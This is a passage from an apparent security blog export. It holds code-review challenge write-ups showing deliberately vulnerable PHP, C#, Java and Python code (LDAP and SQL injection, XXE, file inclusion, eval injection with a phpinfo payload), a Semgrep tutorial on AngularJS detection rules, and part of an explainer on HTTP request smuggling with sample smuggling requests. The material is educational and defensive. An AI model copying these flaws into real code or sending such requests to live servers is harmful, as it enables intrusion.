InputStream to chars on a Writer.As such, you can create a ZIP archive containing an archive path such as ..\\..\\..\\newfile and this file will be written outside the destination directory. This could be abused to overwrite files within the system.Challenge 11&lt;?phpuse Illuminate\\Routing\\Controller;use Illuminate\\Http\\Response;use Illuminate\\Support\\Facades\\Request;class Authenticate{    private function getEmail($email_field, $user_data) {        foreach($email_field as $field) {            if (isset($user_data[0][$field][0])) {                return $user_data[0][$field][0];            }        }        return NULL;    }    public function findUsername() {        $envvar = $this-&gt;settings['fields']['envvar'];        $ldapdn = Config::read('WebApp.ldapDN');        $ldapSearchFilter = Config::read('WebApp.ldapSearchFilter');        $ldapEmailField = Config::read('WebApp.ldapEmailField');        $ldapconn = ldap_connect(Config::read('WebApp.ldapServer'))             or die('LDAP server connection failed');        if (!($ldapbind = ldap_bind($ldapconn))) {            die(\"LDAP bind failed\");        }        if (!empty($ldapSearchFilter)) {            $filter = '(&amp;' . $ldapSearchFilter . '(' .            Config::read('WebApp.ldapSearchAttribut') . '=' .            Request::input($envvar) . '))';        }        $getLdapUserInfo = Config::read('WebApp.ldapFilter');        $result = ldap_search($ldapconn, $ldapdn, $filter, $getLdapUserInfo)            or die(\"LDAP Error: \" . ldap_error($ldapconn));        $ldapUserData = ldap_get_entries($ldapconn, $result);        if (!isset($ldapEmailField) &amp;&amp; isset($ldapUserData[0]['mail'][0])) {            $username = $ldapUserData[0]['mail'][0];        } else if (isset($ldapEmailField)) {            $username = $this-&gt;getEmail($ldapEmailField, $ldapUserData);        } else {            die(\"User not found in LDAP\");        }        ldap_close($ldapconn);        return $username;    }}User concentated data is inserted to the ldap_search function resulting in LDAP Injection: ldap_search($ldapconn, $ldapdn, $filter, $getLdapUserInfo) An ldap query is created with ldapSearchFilter and $envvar. $envvar can be user controlled data, and as such LDAP Injection is possible.Challenge 12using System;using System.Collections;using System.Globalization;using System.Text.RegularExpressions;using Microsoft.AspNetCore.Mvc;using System.Linq;namespace core_api.Controllers{    public class BlogPost {        public DateTime ReleaseDate { get; set; }        public string Content { get; set; }    }    public class BlogController : Controller    {        ArrayList Posts = new ArrayList();        string Keyword = \"[highlight]\";                public void init() {            Posts.Add(new BlogPost{ReleaseDate = new DateTime(2009, 8, 1, 0, 0, 0), Content=\"[highlight]\"});        }               [Route(\"api/search\")]        [HttpGet]        public ArrayList search(string search, string since) {            DateTime.TryParseExact(since, \"MM-dd-yy\", null,                DateTimeStyles.None, out var parsedDate);            var blogposts = from BlogPost blog in Posts                where DateTime.Compare(blog.ReleaseDate, parsedDate) &gt; 0                select blog.Content;            ArrayList result = new ArrayList();            foreach (var content in blogposts) {                String tmp = content.Replace(Keyword, search);                Regex rx = new Regex(search);                Match match = rx.Match(tmp);                if(match.Success) {                    result.Add(match.Value);                }            }            return result;        }    }}A Reject Injection/ReDoS vulnerability exists in the above code. The search argument is provided by user input. This is then provided to the Regex constructor and the user provided input is used for the regex match. An attacker could provide a large regex which could lead to backtracking when eveluating with Regex.Challenge 13import osimport requestsimport errnofrom django.conf import settingsclass Sitemap():    domain = \"sonarsource.com\"    def __init__(self, filename=\"sitemap.xml\"):\tself.url = \"http://\" + self.domain        if not self.url.endswith('/'):            self.url += '/'        self.url += filename        self.destination = os.path.join(settings.STATIC_ROOT, filename)\t    def fetch(self, dataset=None):        headers = {'User-Agent': 'Mozilla/5.0 Chrome/50.2661 Safari/537.36'}        try:            response = requests.get(self.url, timeout=30, headers=headers)        except requests.exceptions.SSLError:            response = requests.get(self.url, verify=False, headers=headers)        finally:            pass        with open(self.destination, 'wb') as f:            f.write(response.content)Two issues exist in the above code:  http:// protocol URI is used as the URL that will be used by requests.get. Usage of Plain text protocols** are considered bad practice.  The verify=False option is set for requests.get. This is disables server certificate validation and is considered to be Insecure Configuration.Challenge 14import java.io.File;import java.io.FileOutputStream;import java.io.IOException;import java.io.InputStream;import java.io.OutputStream;import java.util.Properties;import javax.servlet.ServletContext;import javax.servlet.ServletException;import javax.servlet.http.HttpServletRequest;public class IndexServlet {    private final ServletContext context;    private final String templateFile = \"/org/java/repository.xml\";            public IndexServlet(ServletContext context) {        this.context = context;    }        public void installRepository(HttpServletRequest req)            throws ServletException, IOException {        String mode = req.getParameter(\"mode\");        String repHome = req.getParameter(\"repository_home\");        if (repHome != null &amp;&amp; mode != null &amp;&amp; \"new\".equals(mode)) {            installConfig(new File(repHome));        }    }    private void installConfig(File dest) throws IOException {        InputStream in = context.getResourceAsStream(templateFile);        OutputStream out = new FileOutputStream(dest);        byte[] buffer = new byte[8192]; int read;        while ((read = in.read(buffer)) &gt;= 0) {            out.write(buffer, 0, read);        }        in.close();        out.close();    }}Tainted source is flowing from req.getParameter(\"repository_home\");, this is the provided to the new File constructor and flows to the installConfig method. The user input then flows to the FileOutputStream(dest) method which creates a new file in the give file path, resulting in Arbritary File Write.Challenge 15&lt;?phpif ('restore' == $_GET['action']) {    $upload = $_FILES['filename'];    $upload_tmp = $_FILES['filename']['tmp_name'];    $upload_name = $_FILES['filename']['name'];    $upload_error = $_FILES['filename']['error'];    if ($upload_error &gt; 0) {        switch ($upload_error) {            case UPLOAD_ERR_INI_SIZE:                break;            default:                echo sprintf(\"Error %s\", $upload_error);        }    }    if (!$upload_name &amp;&amp; isset($_POST['file'])) {    $upload_name = filter_input(INPUT_POST,'file',FILTER_SANITIZE_STRING);    } else {        $ret_val = do_upload($upload_tmp, $upload_name);    }    echo '&lt;p&gt;&lt;b&gt;restore from ' . $upload_name . '&lt;/b&gt;';}Multiple issues exist in the above code:  An Insufficient Validation issue exists where a file with any extension can be uploaded  Two Cross-site Scripting (XSS) issues exist. One within the sprintf sink where $upload_error is reflected back a a user. Another XSS exists where $upload_name is reflected back to a user in the echo statement.Challenge 16using System;using System.IO;using System.Xml;using System.Xml.Serialization;using Microsoft.AspNetCore.Mvc;[Serializable]public class ExchangeData {}namespace core_api.Controllers {    public class ShareDataController : Controller {        [Route(\"import/exchange\")]         [HttpPost]        public string ImportExchangeData(string content) {            var xmlDoc = new XmlDocument { XmlResolver = null };            xmlDoc.LoadXml(content);             var rootItem = (XmlElement)xmlDoc.SelectSingleNode(\"root\");            var dataType = Type.GetType(rootItem.GetAttribute(\"data\"));            var reader = new StringReader(rootItem.InnerXml);            ExchangeData exchange = Import(dataType, reader);            return exchange.ToString();        }        private static ExchangeData Import(Type t, StringReader r) {            XmlSerializer serializer = new XmlSerializer(t);            XmlTextReader textReader = new XmlTextReader(r);            ExchangeData data = (ExchangeData)serializer.Deserialize(textReader);            return data;        }    }}An Unsafe Deserialization vulnerability exists in the above code. XmlSerializer is used to deserialize user object provided by the content argument. For XmlSerializer serializer, the expected type should not come from user-controlled input. In the above code, the expected data type is coming from rootItem.GetAttribute(\"data\").Challenge 17import copyimport iofrom http import HTTPStatusfrom zipfile import ZipFilefrom flask import Blueprint, current_app, jsonify, request, send_file@FIXTURE_BLUEPRINT.route('/api/export/&lt;business_id&gt;', methods=['GET'])def get(business_id, table=None):    con = current_app.config.get('DB_CONNECTION', None)    if not con:        current_app.logger.error('Database connection failure')        return jsonify({'message': 'Database connection error'})    cur = con.cursor()    bid = _get_business_id(cur=cur, business_id=business_id)    if not bid:        current_app.logger.error(f'{business_id} not found')        return jsonify({'message': f'Could not find {business_id}.'})    try:        tmp_file = _create_export(cur=cur, table=table, bid=bid)        if not tmp_file:            return jsonify({'message': f'Failed to create export for {bid}'})        current_app.logger.error(f'DELETE: {tmp_file}')        return send_file(attachment_filename=tmp_file, as_attachment=True)    except Exception as err:        current_app.logger.error(f'Failed to export')        con.reset()        return jsonify({'message': 'Failed to export data.'})A Log Injection vulnerability exists where data source coming from business_id is validated and if it doesn’t exist, this is logged into the current_app.logger.error method directly. An attacker could inject CRLF characters (%0D%0A) and adding additional log entries.Challenge 18package org.example;import javax.servlet.ServletException;import javax.servlet.http.*;import java.io.File;import java.io.FileInputStream;import java.io.IOException;import java.io.InputStream;import java.util.List;import java.util.zip.ZipEntry;import java.util.zip.ZipInputStream;import org.jdom2.Content;import org.jdom2.Document;import org.jdom2.JDOMException;import org.jdom2.input.SAXBuilder;public class IndexServlet extends HttpServlet {    private String extractContent() throws IOException, JDOMException {        File uploadFile = new File(\"/users/upload/document.odt\");        InputStream in = new FileInputStream(uploadFile);        final ZipInputStream zis = new ZipInputStream(in);        ZipEntry entry;        List&lt;Content&gt; content = null;        while ((entry = zis.getNextEntry()) != null) {            if (entry.getName().equals(\"content.xml\")) {                final SAXBuilder sax = new org.jdom2.input.SAXBuilder();                Document doc = sax.build(zis);                content = doc.getContent();                StringBuilder sb = new StringBuilder();                if (content != null) {                    for (Content item : content) {                        sb.append(item.getValue());                    }                }                zis.close();                return sb.toString();            }        }        return null;    }    protected void doGet(HttpServletRequest req, HttpServletResponse res)        throws ServletException, IOException    {        try {            extractContent();        }        catch(Exception e) {            return;        }    }}org.jdom2.input.SAXBuilder is used to parse an .odt file. An .odt file contains XML files will be parsed by SAXBuilder, content.xml in this example. In the above example, SAXBuilder is set without builder.setFeature(“http://apache.org/xml/features/disallow-doctype-decl”,true); which provides an attack vector for XML External Entity (XXE). An attacker could modify the content.xml to have external entities.Challenge 19&lt;?phpnamespace App\\Http\\Controllers;use Illuminate\\Support\\Facades\\Request;use Illuminate\\Support\\Facades\\Response;use Illuminate\\Http\\RedirectResponse;class LessonsController6 extends ApiController {    public function load(): RedirectResponse {        if (!empty(Request::cookie('site'))) {            $site_id = Request::cookie('site');        } else if (!empty(Request::getHost())) {            $site_id = Request::getHost();        } else {            $site_id = 'default';        }        if (empty($site_id) || preg_match('/[^A-Za-z0-9.-_]/', $site_id)) {            abort(403, 'Invalid ID ' . htmlspecialchars($site_id, ENT_NOQUOTES));        }        require_once \"sites/$site_id.php\";        if ($config == 1) {            return redirect()-&gt;route('login', ['site' =&gt; $site_id]);        } else {            return redirect()-&gt;route('setup', ['site' =&gt; $site_id]);        }    }}A Local File Inclusion exists in the above code. It is possible to set an arbritary path through a host header (Request::getHost() or a Cookie Request::cookie('site'), The regex used by the code ([^A-Za-z0-9.-_]) does not validate ../../ and this $siteid is provided to require_once \"sites/$site_id.php\";. The .php extension can be bypassed using a null byte (%00).Challenge 20using System;using System.IdentityModel.Tokens.Jwt;using System.Security.Cryptography;using Microsoft.AspNetCore.Mvc;using Microsoft.IdentityModel.Tokens;using Org.BouncyCastle.Crypto;using Org.BouncyCastle.Crypto.Parameters;using Org.BouncyCastle.Security;namespace core_api.Controllers{    public class ApiController : Controller    {        private readonly string publicKey;        \tprivate readonly string authTokenIssuer;                public ApiController(string publicKey, string authTokenIssuer)             {            this.publicKey = publicKey;            this.authTokenIssuer = authTokenIssuer;        }                private String ExportPublicKey(RSACryptoServiceProvider rsa)        {            throw new NotImplementedException();        }        private RSACryptoServiceProvider ImportKeyParameters(string publicKey)        {            throw new NotImplementedException();        }\t            public JwtSecurityToken ValidateToken(string token) {                       byte[] keyBytes = Convert.FromBase64String(publicKey);            var keyParams = (RsaKeyParameters)PublicKeyFactory.CreateKey(keyBytes);            var rsaParams = new RSAParameters {                Modulus = keyParams.Modulus.ToByteArrayUnsigned(),                Exponent = keyParams.Exponent.ToByteArrayUnsigned()             };            var rsa = new RSACryptoServiceProvider();            rsa.ImportParameters(rsaParams);            rsa.KeySize = 4096;            var validationParameters = new TokenValidationParameters {                RequireExpirationTime = true,                RequireSignedTokens = true,                ValidIssuer = authTokenIssuer,                ValidateIssuer = true,                ValidateLifetime = true,                IssuerSigningKey = new RsaSecurityKey(rsa)            };            var handler = new JwtSecurityTokenHandler();            handler.ValidateToken(token, validationParameters, out SecurityToken validatedSecurityToken);            var validatedJwt = validatedSecurityToken as JwtSecurityToken;            return validatedJwt;        }           }}The above code is an example of Insecure Cryptography. RSACryptoServiceProvider constructor by default sets the key size to be 1024. The rsa.KeySize = 4096; assingment does not change the keysize according to the SonarSource expected solution.Challenge 21import osimport tempfile'''Open the pdf reader on windows for the report file'''def open_report(report_class, _system=\"Windows\", *args, **kwargs):    rv = PrintReportEvent.emit(report_class, *args, **kwargs)    if rv:        return rv    filters = kwargs.pop('filters', None)    if filters:        kwargs = describe_search_filters_for_reports(filters, **kwargs)    tmp = tempfile.mktemp(suffix='.pdf', prefix='stoqlib-reporting')    report = report_class(tmp, *args, **kwargs)    report.filename = tmp    if _system == \"Windows\":        report.save()        log.info(\"Executing PDF reader with %r\" % (report.filename, ))        os.startfile(report.filename)        return    if isinstance(report, HTMLReport):        op = PrintOperationWEasyPrint(report)        op.set_threaded()    else:        op = PrintOperationPoppler(report)    rv = op.run()    return rvThe issue here arises from the tempfile.mktemp function being used which allows for potential Race Condition. An attacker could create a file of his choice before the mktemp is triggered by an user. The following stackoverflow explains this vulnerability: Stackoverflow - using-python-tempfiles-permanentlyChallenge 22package com.example.restservice;import org.springframework.beans.factory.annotation.Autowired;import org.springframework.stereotype.Controller;import org.springframework.web.bind.annotation.ModelAttribute;import org.springframework.web.bind.annotation.RequestMapping;import org.springframework.web.bind.annotation.RequestMethod;import org.springframework.web.servlet.ModelAndView;import org.hibernate.criterion.Restrictions;import org.hibernate.criterion.Criterion;import org.hibernate.type.StringType;@Controller@RequestMapping(\"/nodeList.htm\")public class NodeListController {    public NodeListModel createNodeList(NodeListCommand command) {        NodeCriteria criteria = new NodeCriteria(Node.class, \"node\");        addNodeCriteria(criteria, command.getNodeParm(), command.getNodeParmValue());        return createModel(command);    }    @RequestMapping(method={ RequestMethod.GET, RequestMethod.POST })    public ModelAndView handle(@ModelAttribute(\"command\") NodeListCommand command) {        NodeListModel model = createNodeList(command);        ModelAndView modelAndView = new ModelAndView(\"nodeList\", \"model\", model);        return modelAndView.addObject(\"command\", command);    }    private static void addNodeCriteria(NodeCriteria criteria,            String nodeParm, String nodeParmValue) {        final String nodeParameterName = (\"snmp\" + nodeParm).toLowerCase();            criteria.add(Restrictions.sqlRestriction(nodeParameterName + \" = ?)\",             nodeParmValue, new StringType()));               criteria.createAlias(nodeParm, nodeParameterName);        }        private NodeListModel createModel(NodeListCommand command) {        return new NodeListModel();    }}A SQL Injection exists in the above code. Tainted data is flowing from source @ModelAttribute(\"command\") NodeListCommand command. The command argument is then sent to the createNodeList method. The command then flows to the addNodeCriteria method. The nodeParm argument from the addNodeCriteria method is then concentated to the nodeParameterName variable: final String nodeParameterName = (\"snmp\" + nodeParm).toLowerCase();. This then added to the createAlias HQL sink via criteria.addresulting in SQL injection.Challenge 23&lt;?php class email_output_html {    protected function express($expression) {        $expression = preg_replace(            array('/env:([a-z0-9_]+)/i',                '/config:([a-z0-9_]+)(:(\\S+))?/i',            ),            array(\"(isset(\\$this-&gt;env['\\\\1']) ? \\$this-&gt;env['\\\\1'] : null)\",                \"\\$this-&gt;config-&gt;get('\\\\1', '\\\\3')\",            ),            $expression        );        return eval(\"return ($expression);\");    }    protected function parse_template() {        $attributes  = html::parse_attrib_string($_POST['_mail_body']);        foreach($attributes as $attrib) {            if (!empty($attrib['express'])) {                $attrib['c'] = $this-&gt;express($attrib['express']);            }            if (!empty($attrib['name']) || !empty($attrib['command'])) {                $attrib['c'] = $this-&gt;button($attrib);            }        }    }}class html {    public static function parse_attrib_string($str) {\t        $attrib = array();        preg_match_all('/\\s*([-_a-z]+)=([\"\\'])??(?(2)([^\\2]*)\\2|(\\S+?))/Ui', $str, $regs, PREG_SET_ORDER);\t\t        if ($regs) {            foreach ($regs as $attr) {                $attrib[strtolower($attr[1])] = html_entity_decode($attr[3] . $attr[4]);            }        }        return $attrib;    }}A Code Injection exists due to the usage of eval. User input is flowing from the parse_template function to the express function as follows: express($attrib['express'] I wasn’t able to find a bypass for the regex used within the parse_template function; the SonarSource expected solution states that the following payload can be used: /config:sonar:'.phpinfo().’Challenge 24using System;using System.Collections.Generic;using System.ComponentModel;using System.Data;using System.Drawing;using System.Linq;using System.Text;using System.Threading.Tasks;using System.Windows.Forms;using System.IO;using System.Diagnostics;using System.Reflection;namespace core_api{    public partial class Form1 : Form    {        const int MAX_PATH = 10;        public Form1()        {            InitializeComponent();        }        private void btnInstallPackage_Click(object sender, EventArgs e) {            InstallPackage(txtPackage.Text, CurrentProject.ProjectDirectory);        }        public static void InstallPackage(string packageId, string workingDir) {            string dir = Path.Combine(workingDir, \"nuget\");            dir = Path.Combine(dir, packageId).Substring(0, MAX_PATH);            Directory.CreateDirectory(dir);            Process nuget = new Process();            nuget.StartInfo.FileName = Path.Combine(Tools.GetPath(), \"nuget\");            nuget.StartInfo.Arguments = \"install \"+packageId+\" -NonInteractive\";            nuget.StartInfo.CreateNoWindow = true;            nuget.StartInfo.RedirectStandardOutput = true;            nuget.StartInfo.RedirectStandardError = true;            nuget.StartInfo.WorkingDirectory = dir;            nuget.StartInfo.StandardOutputEncoding = System.Text.Encoding.UTF8;            nuget.StartInfo.UseShellExecute = false;            nuget.Start();        }    }    class Tools    {        public static string GetPath()        {            return \"D:\\\\test\\\\VisualNuget\\\\nuget\";        }    }    class CurrentProject    {        public static string ProjectDirectory = \"D:\\\\test\\\\VisualNuget\";    }}The issue here arisies from the InstallPackage method taking a packageId parameter. This parameter is concentated into the arguments :nuget.StartInfo.Arguments = \"install \"+packageId+\" -NonInteractive\"; and is ran as part of the nuget command. It is not possible to conduct a Command Injection attack due to user input only ending up in nuget.StartInfo.Arguments but Argument Injection is possible and run the command with additional arguments that the binary wasn’t expecting."
  },
  
  {
    "title": "Writing AngularJS Security Semantic Rules using Semgrep",
    "url": "/posts/02_writing_angularjs_semgrep_rules/",
    "categories": "software security, static analysis",
    "tags": "semgrep",
    "date": "2020-09-03 03:25:52 +0800",
    





    
    "snippet": "AngularJS Security is something I have looked into in the past. In 2016, I conducted a workshop on AngularJS Security in MWR’s MWRICON which highlighted some common security issues and how they cou...",
    "content": "AngularJS Security is something I have looked into in the past. In 2016, I conducted a workshop on AngularJS Security in MWR’s MWRICON which highlighted some common security issues and how they could be exploited. The materials of this workshop can be seen here: MWRICON 2018.I recently took notice of Semgrep which is a Lightweight static analysis tool. Semgrep is an interesting tool for code reviewers which is more expressive than grep, and is easily customizable to conduct semantic analysis. Since Semgrep is lightweight and fast, it is easy to implement this in a CI/CI pipeline.SemgrepSemgrep is fairly easy to setup and install pip3 install semgrep. Furthermore, the Semgrep Live Editor can also be used to write and save rules on r2c’s system.Semgrep uses pfff (PHP Frontend For Fun) which is a static analysis engine previously developed by facebook and was then deprecated. The developer Yoann Padioleau who initially wrote this now works for r2c. pfff is written in OCaml and it is a set of modules (only few are used as part Semgrep I think).Semgrep internally uses a generic parser using yacc and ocaml-tree-sitter and some custom code to convert any programming language into an Intermediate Language/AST and then it is possible to conduct Fuzzy AST to AST Matching on this result.Looking at the engine code, there are references to pointer analysis and datalog but this doesn’t seem to be currently use and Dataflow/taint analysis seems to be planned in the future release by r2c.Semgrep can be considered a good alternative for ESLint since  Well documented, rules are meant to be powered by community  Semgrep is provided under LGPL-license and is free for commercial use  Very easy to write custom configurations and semantic rules.  Supports popular languages incuding Python, JavaScript, Java, Go, C with PHP and TypeScript support on the way 🥳As such I ported multiple rules from AngularJS Security Rules For ESLint to Semgrep. The pull request I made can be seen here: Pull Request to semgrep-rules repository. This blog post will highlight the basics of using Semgrep with some AngularJS examples.Writing Rules - Strict Contextual escaping (SCE) ExampleIn the code below, the $sceProvider is set to false. Disabling Strict Contextual escaping (SCE) in an AngularJS application could provide additional attack surface for XSS vulnerabilities.var app = angular.module('MyApp', []).config(function ($sceProvider) {    // ruleid: detect-angular-sce-disabled     $sceProvider.enabled(false);}); app.controller('myCtrl', function($scope) { $scope.userInput = 'foo';     $scope.sayHello = function() {\t  $scope.html = \"Hello &lt;b&gt;\" + $scope.userInput + \"&lt;/b&gt;!\"    }; });An example such as the above can be easily solved by using Semgrep since you only need to check if the value of $sceProvider.enabled is false. Live Editor - SCE Disabled rules:- id: my_pattern_id  pattern: |    $sceProvider.enabled(false);  message: |    Semgrep found a match  severity: WARNINGAnd due to the Semgrep only matching AST, this can be used to easily traverse through large codebases quickly.Writing Rules - Open Redirect ExampleThe below code is a command example of open redirect that might happen when user input is conce $window.location.hrefvar app = angular.module('MyApp', []);app.controller('myCtrl', function($scope, $sce) {$scope.userInput = 'foo';    $scope.sayHello = function() {     $window.location.href = input + '/app/logout';     input = $scope.input;     $window.location.href = input + '/app/logout';     //Data is not coming from user input     $location.location.location = test     $window.location.href = \"//untatintedredirect\"   };});One way to match code like this is to use MetaVariables and Expression Matching and the pattern: | option. Expression matching searches code for the given pattern. This pattern can match a full expression, or be part of a subexpression and this can be used to identify concatenation., and metavariables are used to track a value across a specific code scope.This includes variables, functions, arguments, classes, object methods, imports, exceptions, and more. Typed Metavariables are also supported for Java. More information regarding these two features can be seen here: Pattern Features      patterns:        - pattern-either:           - pattern: |              $SOURCE = $INPUT;              $window.location.href = $SOURCE + $STATICVALUE;          - pattern: |              $window.location.href = $SOURCE + $STATICVALUE;This can even be taken one step further using the pattern-inside option and the ellipsis operator. The ellipsis operator can be used to search for specific function calls or function calls with specific arguments. To search for all calls to a specific function, regardless of its arguments. This can be used to check if my initial pattern is occurring inside the app.controller function.            app.controller(..., function($scope,$sce){             ...            });Live Editor ExampleThe ellipsis operator itself is very useful and can be used to check for specific function calls, method calls, function definitions, class definitions, strings, arrays and conditionals.Another example of using ellipsis is identifying the usage of angular.element method. angular.element can lead to XSS if after,append,html,prepend,replaceWith,wrap are used with user-input. This can be matched using a pattern such as the below:angular.element($SOURCE).html(...);The same concept can also be applied to match expressions that could be nested deep within another expression. Deep Expression OperatorSemgrep YAML File BreakdownPatterns/Rules can be contributed to the semgrep-rules as a YAML file. An example of a pull request can be seen here: Pull RequestAn example of a YAML file can be seen below:rules:    - id: detect-angular-translateprovider-useStrategy-method      patterns:        - pattern-either:           - pattern: |              $translateSanitization.useStrategy();        - pattern-inside: |            app.controller(..., function($scope,$sce){             ...            });      message: |                If the $translateSanitization.useStrategy is set to null or blank this can be dangerous.      languages:      - javascript      severity: WARNING      metadata:        references:            - https://docs.angularjs.org/api/ng/service/$sce#trustAsUrl            - https://owasp.org/www-chapter-london/assets/slides/OWASPLondon20170727_AngularJS.pdf    - id: detect-angular-translateprovider-translations-method      patterns:        - pattern-either:           - pattern: |              $translateProvider.translations(...,$SOURCE);        - pattern-inside: |            app.controller(..., function($scope,$sce){             ...            });      message: |                The use of $translateProvider.translations method can be dangerous if user input is provided to this API.      languages:      - javascript      severity: WARNING      metadata:        references:            - https://docs.angularjs.org/api/ng/service/$sce#trustAsUrl            - https://owasp.org/www-chapter-london/assets/slides/OWASPLondon20170727_AngularJS.pdfThis can be broken down as:  patterns – Pattern option to match  language – Language syntax that can be matchedImport YAML keys:  id - ID of a rule, multiple rules can be added in the same file which can be triggered by one ID  metadata - Provide additional information such as references/links  message -Message to display when pattern is matched  pattern - Here we specify the logical option for a pattern to be matched. This can be pattern-not, pattern-inside, pattern, pattern-not-inside etc  severity - Severity of the ruleConcluding ThoughtsWhile Semgrep doesn’t support fully fledged static/program analysis such as CodeQL, it can be useful for writing quick patterns to search through large codebases quickly. I often find these sorts of features useful when trying to find interesting starting entry points while code reviewing which I can then dig into myself.I looked forward to Semgrep being the successor of other grep based code scanning projects such as GrepBugs and other open source projects which have died in the past."
  },
  
  {
    "title": "Demystifying HTTP request smuggling",
    "url": "/posts/28_Demystifying_HTTP_request_smuggling/",
    "categories": "software security",
    "tags": "http request smuggling",
    "date": "2020-07-01 03:25:52 +0800",
    





    
    "snippet": "This is a cross post of the blog post written here:https://snyk.io/blog/demystifying-http-request-smuggling/. Often at my role as a Security Analyst within Snyk, I study trends within the dependenc...",
    "content": "This is a cross post of the blog post written here:https://snyk.io/blog/demystifying-http-request-smuggling/. Often at my role as a Security Analyst within Snyk, I study trends within the dependency ecosystem which can result in finding interesting vulnerabilities. Recently I looked at HTTP Request Smuggling which resulted in the following disclosures.  netius HTTP Request Smuggling  reel HTTP Request Smuggling  meinheld HTTP Request Smuggling  goliath HTTP Request Smuggling  agoo HTTP Request SmugglingFor verifying the above libraries/packages/servers, i found the following tools very useful:  HTTP Request Smuggler  Turbo Intruder  Smuggler  Turbo Intruder ScriptsDemystifying HTTP request smugglingHTTP request smuggling is an interesting vulnerability type that has gained popularity over the last year. This vulnerability could allow an attacker to leverage specific features of the HTTP/1.1 protocol in order to bypass security protections, conduct phishing attacks, as well as obtain sensitive information from requests other than their own.It should also be noted that request smuggling has received widespread community attention through numerous high-paying bug bounty reports in the last few months, and Snyk observed that 18 HTTP request smuggling related to dependencies have been published in 2020 so far.This vulnerability was first discussed by Watchfire in their 2005 whitepaper entitled “HTTP Request Smuggling”. This work was later expanded upon by researcher Regis Leroy and further discussed by James Kettle from Portswigger security during BlackHat USA 2019 which gained further media attention.This blog post aims to demystify the vulnerability and provide remediation details for open source project maintainers looking to patch HTTP request smuggling within their projects.BackgroundWith new attacks and vulnerabilities gaining popularity and media traction, open source libraries are often targeted by attackers to be exploited in the wild. It can often take weeks or years for these vulnerabilities to be remediated properly within these libraries due to a lack of remediation knowledge. In order to make the open source community secure, the Snyk Security Team often conducts research into vulnerabilities, such as HTTP request smuggling, to discover vulnerabilities within open source dependencies and provide actionable remediation advice to maintainers.One such task was undertaken by Snyk to identify the impact of HTTP request smuggling within the open source dependency ecosystem which resulted in discovering numerous vulnerabilities. More information regarding the discovered vulnerabilities can be found here.Snyk found that there are not enough public sources that provide proper guidance into remediating HTTP request smuggling. Furthermore, it was noted that it took maintainers multiple releases to properly address and remediate this vulnerability. With this blog post, we aim to close that gap and help provide detailed remediation advice to any maintainer looking for guidance on this issue.HTTP request smuggling vulnerability explainedIn order to understand HTTP Request Smuggling, the following areas must first be understood:Keep-Alive and pipeliningThe concept of keep-alive and pipelining was initially published in RFC 2616.The Keep-Alive header is a hop-by-hop header that provides information about a persistent connection. In web servers, Keep-Alive can be specified within the “Connection” header which allows a web server to keep a TCP socket/connection open. By using this header, multiple requests and responses can use a single connection which can reduce overhead and improve performance for a web server. This feature is supported by all browsers and servers today.Pipelining is another feature that was introduced in RFC 2616. This allows a web server to process requests asynchronously—as a first-in-first-out stream rather than processing each request individually, allowing it to send a request without waiting for a previous response to arrive.Content-Length and Transfer-EncodingHTTP requests can have a message body. The presence of a message body in a request is signaled by a Content-Length or Transfer-Encoding header field. These headers are used for message framing, telling a server where a message ends and another begins.The Content-Length, specified in RFC 7230, section 3.3.2, is an HTTP header that indicates the size of the entity-body of the request. This is commonly seen in HTTP POST requests which have a body of data. It should be noted that GET requests typically shouldn’t contain the Content-Length header since they have no body.Transfer-Encoding, also specified in RFC 7230, was created to allow the sending of binary data over HTTP. Transfer-Encoding has numerous directives, this blog will focus on the chunked directive.The chunked directive allows data to be sent in a series of chunks along with the length of these chunks specified in hexadecimal format, followed by carriage return and a line feed. The end of a chunked directive is stated by 0 and an empty sequence. An example of a chunked request can be seen below.POST / HTTP/1.1Host: snyk.ioContent-Type: application/x-www-form-urlencodedTransfer-Encoding: chunked7 (length of chunks)foo=bar (series of chunks)0 (0 to terminate request followed by \\r\\n)(\\r\\n)Request smugglingA modern web server stack will often contain multiple web servers along with load balancers and WSGI servers. A basic diagram to visualize this can be seen as:HTTP request smuggling vulnerabilities arise when the frontend and the backend interpret the boundary of an HTTP request differently causing desynchronization between them. This is due to numerous frontend and backend libraries deviating from RFC specifications when dealing with both the Content-Length and the Transfer-Encoding header. HTTP request bodies can be framed according to these two headers and deviations from the specification occur. As a result, part of a request gets appended or smuggled, to the next one which allows the response of the smuggled request to be provided to another user.This vulnerability can be exploited to conduct phishing attacks, cache poisoning, Cross-Site Scripting (XSS), and more. More information regarding exploiting this vulnerability was published by James Kettle last year, during BlackHAT USA 2019, titled “HTTP Desync Attacks: Request Smuggling Reborn”. This blog will focus on the two most common request smuggling techniques:  CL:CL: Double Content-Length attack technique  CL:TE: Content-Length Transfer-Encoding attack techniqueCL:CL: Double Content-Length attack techniqueAccording to RFC 7230, section 3.3.3#4, “If a message is received without Transfer-Encoding and with either multiple Content-Length header fields having differing field-values or a single Content-Length header field having an invalid value, then the message framing is invalid and the recipient MUST treat it as an unrecoverable error”However, most middleware and web servers currently will loosely handle GET requests with a body. Furthermore, RFC 7231, section4.3#4.3.1 states “A payload within a GET request message has no defined semantics; sending a payload body on a GET request might cause some existing implementations to reject the request”. This indicates this is a behavior most servers and proxies might support. TIn some cases, this can result in request smuggling attacks. This blog will explore one variation of this attack.GET / HTTP/1.1Content-Length: 43Content-Length: 0Host: snyk.ioGET /reqsmuggle HTTP/1.1Host: snyk.ioWhen provided with two Content-Length headers, if implementation differences occur between a frontend and a backend on which Content-Length header to prioritize, smuggling attacks can occur.In the above HTTP request, a request with two Content-Length headers is sent to a target that has a proxy or a load balancer as a frontend. The proxy will respect and prioritize the first Content-Length and see the smuggled request as part of the request body, even though a GET request shouldn’t have a request body, and two Content-Length headers are provided. When this is processed by the backend, the first Content-Length header is ignored and the second Content-Length header is prioritized. Since the second Content-Length was set to zero, the backend will expect no request body and the /reqsmuggle request is treated as another pipelined request. As such, the response of this smuggled request could be received by another user.HTTP/1.1 200 OKContent-Length: 11hello worldHTTP/1.1 404 Not FoundConnection: CloseContent-Length: 0CL:TE: Content-Length Transfer-Encoding attack techniqueThis popular technique discovered by James Kettle of PortSwigger labs involves placing a Content-Length header and a Transfer-Encoding header in a single HTTP request and manipulating it in a way where a frontend proxy and backend server will prioritize these headers and process the smuggled request differently. An example request which demonstrates this vulnerability can be as follows.POST /login HTTP/1.1Host: snyk.ioContent-Type: application/x-www-form-urlencodedContent-Length: 62Transfer-Encoding: chunked16login=xxx&amp;amp;password=xxx0GET /404 HTTP/1.1X-Foo: barWhen this request gets processed by a frontend proxy, it will respect the Content-Length header and prioritize this over the Transfer-Encoding header. However, the backend server will prioritize the 